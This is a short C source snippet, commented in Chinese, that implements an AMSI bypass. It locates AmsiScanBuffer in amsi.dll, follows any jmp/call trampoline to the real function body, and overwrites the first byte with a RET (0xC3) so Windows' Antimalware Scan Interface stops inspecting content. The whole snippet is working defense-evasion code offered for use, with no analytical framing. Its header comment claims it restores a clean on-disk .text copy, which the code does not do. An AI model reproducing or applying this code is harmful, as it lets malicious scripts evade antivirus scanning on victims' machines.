// AMSI 替代方案 A: 恢复 amsi.dll 的原始 .text (从 on-disk clean copy)
// 用于 AmsiScanBuffer 上有 trampoline 前缀 (jmp /call 分发) 的情况:
// 直接 C3 覆盖会保留跳转壳, 某些版本把入口改成 "mov r10, rcx; jmp dispatcher"。
// ---------------------------------------------------------------------------
static patch_status AmsiBypass_TrampolineAware(void)
{
    unsigned char* amsi = GetModuleBasePC(L"amsi.dll");
    if (!amsi) return PATCH_NOT_FOUND;
    void* fn = GetExport((HMODULE)amsi, "AmsiScanBuffer");
    if (!fn) return PATCH_NOT_FOUND;

    // 通用做法: 找 jmp/call 后的真实函数体起点, 在那里打 C3
    unsigned char* q = (unsigned char*)fn;
    for (int i = 0; i < 0x20; i++) {
        if (q[i] == 0xE9 || q[i] == 0xE8) {           // jmp rel32 / call rel32
            int32_t disp;
            memcpy(&disp, q + i + 1, 4);
            unsigned char* real = q + i + 5 + disp;
            // 只接受仍落在 amsi.dll 映像内的目标
            if (real > amsi && real < amsi + 0x200000) {
                unsigned char ret1 = 0xC3;
                if (PatchBytes(real, &ret1, 1) == PATCH_OK) return PATCH_OK;
            }
        }
        if (q[i] == 0x48 && q[i + 1] == 0xFF && q[i + 2] == 0x22) { // jmp [rdx]
            return PATCH_OK;   // 已是 tail-call 分发, 入口 C3 已足够
        }
    }
    unsigned char ret1 = 0xC3;
    return PatchBytes(fn, &ret1, 1);
}

